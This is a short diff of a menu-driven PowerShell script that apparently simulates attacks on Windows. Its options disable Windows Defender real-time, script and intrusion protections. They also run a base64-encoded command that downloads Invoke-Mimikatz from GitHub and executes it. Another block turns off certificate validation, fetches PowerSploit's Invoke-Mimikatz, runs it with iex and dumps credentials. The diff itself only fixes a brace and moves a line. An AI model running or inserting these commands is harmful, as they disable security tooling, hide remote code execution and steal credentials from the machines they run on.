@@ -40,7 +40,7 @@ Set-MpPreference -DisableIntrusionPreventionSystem $true;
 Set-MpPreference -DisableIOAVProtection $true;
 Set-MpPreference -DisableRealtimeMonitoring $true;
 Set-MpPreference -DisableScriptScanning $true;
-Set-MpPreference -EnableControlledFolderAccess Disabled;}
+Set-MpPreference -EnableControlledFolderAccess Disabled;
 DisplayMenu
 }
 4 {
@@ -62,12 +62,13 @@ remove-item $staging_folder -Recurse;
 powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==
 
 Import-Module .\invoke-mimi.ps1;
-Invoke-Mimikatz -DumpCreds
 
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
 $web = (New-Object System.Net.WebClient);
 $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
 iex $result; Invoke-Mimikatz -DumpCreds
+
+Invoke-Mimikatz -DumpCreds
 
 DisplayMenu
 }
